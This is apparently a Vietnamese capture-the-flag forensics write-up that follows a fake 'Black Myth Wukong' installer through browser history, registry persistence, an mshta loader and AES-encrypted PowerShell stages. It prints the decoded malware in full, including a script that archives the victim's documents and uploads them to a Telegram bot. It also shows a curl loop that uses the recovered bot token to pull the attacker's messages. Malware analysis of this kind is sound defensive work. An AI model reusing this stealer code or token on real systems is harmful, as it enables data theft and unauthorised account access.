# Counter Defensive

Đi thẳng vào câu hỏi luôn nhé:

### 1.  What time did the victim finish downloading the Black-Myth-Wukong64bit.exe file? Please, submit the epoch timestamp. (ie: 168061519)

+ Đề chỉ cấp cho disk folder của `Users`, điều này dẫn đến khá ít thứ để trace. Tuy nhiên dựa vào câu hỏi, ta có thể suy đoán rằng file này được download từ trình duyệt về, mình extract `History` của Brave về:

  Tại table `download_url_chains`, ta có url download của con exe như câu hỏi:

  ![image](https://github.com/NVex0/uWU/assets/113530029/203ffc36-7fd2-4337-ab46-0c83c76d5f25)

  Lấy end time khi tải xong con exe, convert từ webkit time sang epoch:

  ![image](https://github.com/NVex0/uWU/assets/113530029/70426ab4-d3a1-4ca0-9310-c38dcf0fbdcf)

  ![image](https://github.com/NVex0/uWU/assets/113530029/94e9110d-5188-431f-8d2c-5f8bb1bb2296)

> Ans: 1713451126

### 2. What is the full malicious command which is run whenever the user logs in? (ignore explorer.exe, ie: nc.exe 8.8.8.8 4444)

+ Câu hỏi hướng ta đến tìm persistence từ malware, tuy nhiên src malware đã bị xóa sạch :v, không thể đọc src mà tìm được. Ở đây mình chọn cách trace theo list common persistence path trong registry của user này:

```
Software\Microsoft\Windows\CurrentVersion\Runonce
Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run
Software\Microsoft\Windows\CurrentVersion\Run
SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
```

+ Tại `SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` ta thấy key `shell` có value tham chiếu đến `explorer.exe`, ngoài ra còn chạy song song command bên cạnh: 

  ![image](https://github.com/NVex0/uWU/assets/113530029/0142385e-e213-4c59-80dd-0ae74be352e3)

  `%PWS%` ở đây là Powershell:

  ![image](https://github.com/NVex0/uWU/assets/113530029/f1382282-284e-44bb-a653-9e195eab8b90)

  chạy kèm tham số `noprofile` và `-windowstyle hidden` nữa thì chắc cú rồi :v. Dựa vào example, ta có answer:

> %PWS% -nop -w h "start "$env:temp\wct98BG.tmp""

### 3. What is the first process that starts when the malicious file is opened? (ie: svhost.exe) 

+ Dựa vào command persistence, mình tìm tới tmp file:

  ![image](https://github.com/NVex0/uWU/assets/113530029/430da6a1-c283-470a-9630-a15491168179)

+ Không phải 1 file powershell, 1 mớ byte khá random. Ngoài ra extension `.tmp` cũng không phải default ext của Windows, mình tiếp tục check cách nó handle đuôi này từ `UsrClass.dat`:

  ![image](https://github.com/NVex0/uWU/assets/113530029/a15a9ba5-42a0-4023-a097-9f8e7ebcc77f)

+ Key này được reg bởi malware, khi gọi đến file tmp sẽ dùng handler là value của key `.tmp`, handler sẽ gọi `mshta.exe` lên để chạy con Js:

  ![image](https://github.com/NVex0/uWU/assets/113530029/0ee6353a-bff0-42bb-a24c-b7051ca944ab)

> Ans: mshta.exe

### 4. What is the value of the variable named **cRkDgAkkUElXsDMMNfwvB3** that you get after decoding the first payload? (ie: randomvalue)

+ Mình dùng `de4js` để clean lại js:

  ![image](https://github.com/NVex0/uWU/assets/113530029/edb620de-4749-464c-ae10-0fc3053971f0)

  Script này lấy value từ key `HKCU\\software\\Classes\\Directory\\DisplayName` ra, đảo chuỗi rồi decode hex:

  ![image](https://github.com/NVex0/uWU/assets/113530029/cc171e02-05b4-4a14-bde4-434523c76f56)

  ![image](https://github.com/NVex0/uWU/assets/113530029/aefec5fa-66e2-4812-a6ac-fbf49c9291bf)

  Tiếp tục clean code bằng `de4js`, từ script này, ta có đáp án:

> CbO8GOb9qJiK3txOD4I31x553g

### 5. What algorithm/encryption scheme is used in the final payload? (ie: RC4)

+ Hầu như các variable được assign value nhìn base64 đều là rác, ở đây mình tập trung vào các hàm tính toán:

  Decode hex cái biến được assign to đùng ở trên đầu:

  ![image](https://github.com/NVex0/uWU/assets/113530029/53b29da5-06c4-4889-807a-f4db5b89192c)

  Read value từ key như trong hình, xor với biến đã decode ở trên:

  ![image](https://github.com/NVex0/uWU/assets/113530029/71440053-c8a4-46d1-aea5-89d9c2694065)

  ![image](https://github.com/NVex0/uWU/assets/113530029/2d47bde9-a8de-4a3a-b347-f3d5896d4044)

  Cuối cùng eval result ở trên. Thực hiện tương tự với cyberchef, ta được script kế như này:

  ![image](https://github.com/NVex0/uWU/assets/113530029/a5686256-87fd-42ca-9fbc-7445988aa9a7)
  
  Decode base64:

  ![image](https://github.com/NVex0/uWU/assets/113530029/58033ced-5fdc-4c0c-9635-e0d8cca41638)

  Sau khi clean, dễ thấy script gọi `AesManaged`. Từ đó ta có đáp án.

> Ans: AES

### 6. What is the full path of the key containing the password to derive the encryption key? (ie: HKEY_LOCAL_MACHINE\SAM\SAM\LastSkuUpgrade)

+ Với code powershell, ta phân tích được:

  ```
  Hàm h1 tính md5.

  Hàm s9 tìm đệ quy registry, nếu có value nào match md5 thì trả về path. Hàm s9 được gọi 1 lần trong script để tính hash match `6ca24d7c7f6f6465afb82dacd1b0c71f`.

  Hàm n9 decrypt AES. 
  ```

+ Ở đây mình thêm 1 dòng, nếu match hash thì print path luôn:

  ![image](https://github.com/NVex0/uWU/assets/113530029/94869320-8f48-478e-ad5e-2e2f1db72ce8)

  Và mình có được path kèm value match cái hash đấy:

  ![image](https://github.com/NVex0/uWU/assets/113530029/6e8db585-ac16-46fd-8bf7-0e38aad17671)

> Ans: HKEY_CURRENT_USER\software\classes\Interface\{a7126d4c-f492-4eb9-8a2a-f673dbdd3334}\TypeLib

### 7. What is the attacker's Telegram username? (ie: username)

+ Mình modify lại script theo các value được get từ registry truyền vào, với in giá trị cuối ra thôi :v

```
[System.Net.ServicePointManager]::SecurityProtocol=@(("{1}{0}" -f'12','Tls'),("{1}{0}"-f 's11','Tl'),"Tls",("{0}{1}" -f'Ssl','3'));
$a1=gp ((("{1}{3}{0}{4}{2}{5}" -f 'ntk','HKCU','ro',':','ntkEnvi','nment')).rEpLaCe(([cHar]110+[cHar]116+[cHar]107),'\'));
$j2=$a1.Update;
$F2="06bbc6ad-a624-416f-8163-30410218a149";
$y3=[byte[]] -split ("8f575c4d35340e9eba024a9fc6078eb77b78098c8bbebdf87cc00ec4ff7ebebccdf4e76dd66209887c70c14a39808e5a8628c579595a373ce3e7e980a3f0d63065941eef41f3726f1437b55389b80117" -replace '..', '0x$& ');
$j5=[byte[]] -split ("93b4543062046283c32adde19625f66f5c9ff9fe38f2a3cb8bef060880fb42965e132de327675e0165937992ca8a0bd8" -replace '..', '0x$& ');
$g1=[byte[]] -split ("caea556bb7fa0634c63f7c12f1ccab1a5eecce0f45153147ff418d71e5360ecddce3c229b8c6ec9a92216cfff01ea63c" -replace '..', '0x$& ');
function h1($j0){$v4=[System.Security.Cryptography.HashAlgorithm]::Create('md5');
$x3=$v4.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($j0));
$n6=[System.BitConverter]::ToString($x3);
return $n6.Replace('-','')};
function s9($n1,$x8){
    $k7=gi $n1;
    foreach($b5 in $k7.Property){
        $u6=$k7.Name+";"+$b5;
        $x3=h1 $u6;
        if($x8 -eq $x3){
            return ((gp $n1 -Name $b5).$b5)
        }
    }
    foreach($n2 in $k7.GetSubkeyNames()){
        $v8=s9 ($n1+"\"+$n2) $x8;
        if($v8.Length -gt 0){
            return $v8
        }
    }
    return ""
};
function n9{
    param([byte[]]$n3)
    $c4=New-Object System.IO.MemoryStream($n3,0,$n3.Length);
    $c5=New-Object Byte[](32);
    $x2=$c4.Read($c5,0,$c5.Length);
    if($x2 -ne $c5.Length){exit}$b5=New-Object System.Security.Cryptography.Rfc2898DeriveBytes($m0,$c5);
    $b7=$b5.GetBytes(32);
    $v9=$b5.GetBytes(16);
    $h5=New-Object Security.Cryptography.AesManaged;
    $e3=$h5.CreateDecryptor($b7,$v9);
    $w5=New-Object IO.MemoryStream;
    $q7=New-Object System.Security.Cryptography.CryptoStream($c4,$e3,[System.Security.Cryptography.CryptoStreamMode]::Read);
    $q7.CopyTo($w5);
    $w5.Position=0;
    $y5=New-Object IO.StreamReader($w5);
    $u9=$y5.ReadToEnd();
    $y5.Dispose();
    $q7.Dispose();
    $w5.Dispose();
    $c4.Dispose();
    return $u9};
$m0=s9 ((("{2}{0}{8}{5}{3}{1}{9}{6}{4}{7}"-f 'C','qIoclassesqIo','HK','e','rfac','r','e','e','U:qIosoftwa','Int')).REPlacE(([CHaR]113+[CHaR]73+[CHaR]111),[String][CHaR]92)) ("{0}{3}{5}{1}{2}{7}{4}{6}{8}" -f'6ca2','f6f6','465afb8','4d7c','cd1b','7','0c','2da','71f');
$g11=n9 $g1;
$j51=n9 $j5;
$y31=n9 $y3;
$i0="$g11`:$y31";
echo $i0
echo $j51
```

+ Từ đây mình có được API và chat_id sau khi decrypt:

  ![image](https://github.com/NVex0/uWU/assets/113530029/7aaa3a26-e8b8-444d-94d1-8697e5e8fa81)

+ Sau khi có API bot, bắt đầu infiltrate nó thôi. Mình dùng script python sau để bruteforce message id forward tin nhắn từ attacker với bot về tele mình:

  ```
  import os
  for i in range(7000):
    command = """
    curl -S "https://api.telegram.org/bot7035285918:AAE_fggsw0MN6tv7HJbMWVXdoiaoaGBMcy4/forwardMessage?chat_id={id_của_mình}&from_chat_id=6959962141&message_id={0}"                                  
    """
    command = command.format(str(i))
    os.system(command)
    print("\n\n")
  ```
  
+ Check tele:

  ![image](https://github.com/NVex0/uWU/assets/113530029/96dd3f60-b895-481e-a7b6-9f31b76de18d)

> Ans: Pirate_D_Mylan

### 8. What day did the attacker's server first send a 'new-connection' message? (Format: DD/MM/YYYY)

  ![image](https://github.com/NVex0/uWU/assets/113530029/d5d9433a-2a85-4bac-be1b-f7e9023d83da)

  Với tin nhắn "new connection", check time tương ứng với response trả về, ta sẽ có thời gian.

> Ans: 18/04/2024

### 9. What's the password for the 7z archive

+ Từ 1 tin nhắn là script chạy trên máy victim rồi forward lên bot, ta lại tiếp tục xử lý nó:

  ![image](https://github.com/NVex0/uWU/assets/113530029/14f15221-fd42-47d3-9356-68bfd563ba36)

```
[System.Net.ServicePointManager]::SecurityProtocol=@("Tls12","Tls11","Tls","Ssl3")
$a1=gp "HKCU:\\Environment"
function h1($j0) {
    $v4 = [System.Security.Cryptography.HashAlgorithm]::Create('md5')
    $x3 = $v4.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($j0))
    $n6 = [System.BitConverter]::ToString($x3)
    return $n6.Replace('-', '')
}
$j2=$a1.Update
$F2=$a1.guid
$g1=$a1.bid
$y3=$a1.tid
$j5=$a1.hid
function s9($n1, $x8) {
    $k7 = gi $n1
    foreach($b5 in $k7.Property){ 
        $u6 = $k7.Name + ";" + $b5
        $x3 = h1 $u6
        if($x8 -eq $x3){
            return ((gp $n1 -Name $b5).$b5)
        }
    }
    foreach($n2 in $k7.GetSubkeyNames()){
        $v8 = s9 ($n1 + "\" + $n2) $x8
        if($v8.Length -gt 0){
            return $v8
        }
    }
    return ""
}
$m0 = s9 "HKCU:\software\classes\Interface" "6ca24d7c7f6f6465afb82dacd1b0c71f"
function n9 {
    param (
        [byte[]]$n3
    )
    $c4 = New-Object System.IO.MemoryStream($n3, 0, $n3.Length)
    $c5 = New-Object Byte[](32)
    $x2 = $c4.Read($c5, 0, $c5.Length)
    if ($x2 -ne $c5.Length) {
        exit
    }
    $b5 = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($m0, $c5)
    $b7  = $b5.GetBytes(32)
    $v9   = $b5.GetBytes(16)
    $h5 = New-Object Security.Cryptography.AesManaged
    $e3 = $h5.CreateDecryptor($b7, $v9)
    $w5 = New-Object IO.MemoryStream
    $q7 = New-Object System.Security.Cryptography.CryptoStream(
        $c4, $e3, [System.Security.Cryptography.CryptoStreamMode]::Read)
    $q7.CopyTo($w5)
    $w5.Position = 0
    $y5 = New-Object IO.StreamReader($w5)
    $u9 = $y5.ReadToEnd()
    $y5.Dispose()
    $q7.Dispose()
    $w5.Dispose()
    $c4.Dispose()
    return $u9
}
$j51 = n9 $j5
$y31 = n9 $y3
$g11 = n9 $g1
$i0 = "$g11`:$y31"
$s74=@('.doc','.docx','.xls','.xlsx','.ppt','.pptx','.pdf')
$l01="$env:temp\documents_$((Get-Date).ToString('yyyyMMddHHmmss')).csv"
$w51="$env:temp\documents_$((Get-Date).ToString('yyyyMMddHHmmss')).7z"
$h75=$env:temp
$w51s=Get-ChildItem -Path ([System.IO.Path]::Combine($env:USERPROFILE,'Documents')) -Recurse -ErrorAction SilentlyContinue|Where-Object{$s74 -contains $_.Extension}|Select-Object Name,FullName,LastWriteTime,Length
$w51s|Export-Csv -Path $l01 -Encoding Unicode
$w51s|ForEach-Object{Copy-Item -Path $_.FullName -Destination ([System.IO.Path]::Combine($h75,$_.Name)) -Force}
$v13=[System.Text.Encoding]::ascii
& 'C:\Program Files\7-Zip\7z.exe' a -t7z -mx5 -parameter-none $w51 $l01 $w51s.FullName|Out-Null
Add-Type -AssemblyName System.Net.Http
$form=new-object System.Net.Http.MultipartFormDataContent
$form.Add($(New-Object System.Net.Http.StringContent $j51),'chat_id')
$Content=[System.IO.File]::ReadAllBytes($w51)
$n82=New-Object System.Net.Http.ByteArrayContent ($Content,0,$Content.Length)
$n82.Headers.Add('Content-Type','text/plain')
$m63=$v13.getstring($v13.getbytes("$($env:COMPUTERNAME).7z"))
$form.Add($n82,'document',$m63)
$ms=new-object System.IO.MemoryStream
$form.CopyToAsync($ms).Wait()
irm -Method Post -Body $ms.ToArray() -Uri "https://api.telegram.org/bot$i0/sendDocument" -ContentType $form.Headers.ContentType.ToString()
$w51s|ForEach-Object{Remove-Item -Path ([System.IO.Path]::Combine($h75,$_.Name)) -Force}
ri -Path $l01 -Force
ri -Path $w51 -Force
```

+ Dễ thấy đoạn dùng 7z set tham số cho -p (password). (Đoạn này bị lừa troll quá :)))

> Ans: arameter-none

### 10. Submit the md5sum of the 2 files in the archive that the attacker exfiltrated (sort hashes, connect with '_', ie: 5f19a..._d9fc0...) 

![image](https://github.com/NVex0/uWU/assets/113530029/88db624f-26f3-4947-bdf3-1f3e6d05404f)

+ Và sau khi có pass ở câu 9, mở zip ra lấy hash thôi.

> Ans: 83aa3b16ba6a648c133839c8f4af6af9_ffcedf790ce7fe09e858a7ee51773bcd





 



  


  

  

  

  




